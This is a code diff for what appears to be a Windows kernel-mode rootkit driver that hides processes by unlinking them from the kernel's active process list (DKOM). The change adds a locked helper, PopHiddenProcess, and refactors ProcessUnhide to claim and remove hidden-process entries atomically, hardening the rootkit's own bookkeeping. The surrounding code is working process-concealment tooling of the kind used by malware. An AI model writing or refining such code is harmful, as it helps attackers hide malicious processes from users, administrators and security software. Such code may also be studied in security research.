@@ -85,6 +85,27 @@ static BOOLEAN RemoveHiddenProcess(ULONG ProcessId) {
   return FALSE;
 }
 
+static BOOLEAN PopHiddenProcess(ULONG ProcessId, PLIST_ENTRY *OriginalLinks,
+                                PEPROCESS *ProcessObject) {
+  ULONG i;
+
+  ExAcquireFastMutex(&g_HiddenListLock);
+
+  for (i = 0; i < g_HiddenProcessCount; i++) {
+    if (g_HiddenProcesses[i].ProcessId == ProcessId) {
+      *OriginalLinks = g_HiddenProcesses[i].OriginalLinks;
+      *ProcessObject = g_HiddenProcesses[i].ProcessObject;
+      g_HiddenProcesses[i] = g_HiddenProcesses[g_HiddenProcessCount - 1];
+      g_HiddenProcessCount--;
+      ExReleaseFastMutex(&g_HiddenListLock);
+      return TRUE;
+    }
+  }
+
+  ExReleaseFastMutex(&g_HiddenListLock);
+  return FALSE;
+}
+
 // ProcessModuleInitialize sets up the hidden-process registry and resolves the
 // EPROCESS offsets required by the DKOM routines.
 
@@ -197,7 +218,6 @@ NTSTATUS ProcessUnhide(ULONG ProcessId) {
   PLIST_ENTRY originalLinks = NULL;
   ULONG activeLinksOffset = GetActiveProcessLinksOffset();
   ULONG lockOffset = GetProcessLockOffset();
-  ULONG i;
 
   if (!IsValidProcessId(ProcessId))
     return STATUS_INVALID_PARAMETER;
@@ -205,18 +225,8 @@ NTSTATUS ProcessUnhide(ULONG ProcessId) {
   if (activeLinksOffset == 0 || lockOffset == 0)
     return STATUS_UNSUCCESSFUL;
 
-  // Resolve the saved list node and process object for the given PID.
-  ExAcquireFastMutex(&g_HiddenListLock);
-  for (i = 0; i < g_HiddenProcessCount; i++) {
-    if (g_HiddenProcesses[i].ProcessId == ProcessId) {
-      originalLinks = g_HiddenProcesses[i].OriginalLinks;
-      targetProcess = g_HiddenProcesses[i].ProcessObject;
-      break;
-    }
-  }
-  ExReleaseFastMutex(&g_HiddenListLock);
-
-  if (!originalLinks || !targetProcess)
+  // Atomically claim and remove the saved list node and process object for the PID.
+  if (!PopHiddenProcess(ProcessId, &originalLinks, &targetProcess))
     return STATUS_NOT_FOUND;
 
   // Check if the process exited while it was hidden.
@@ -251,8 +261,6 @@ NTSTATUS ProcessUnhide(ULONG ProcessId) {
 
   // Release the reference held since ProcessHide
   ObDereferenceObject(targetProcess);
-
-  RemoveHiddenProcess(ProcessId);
 
   DbgPrint("Revealed process %lu.\n", ProcessId);
   return status;
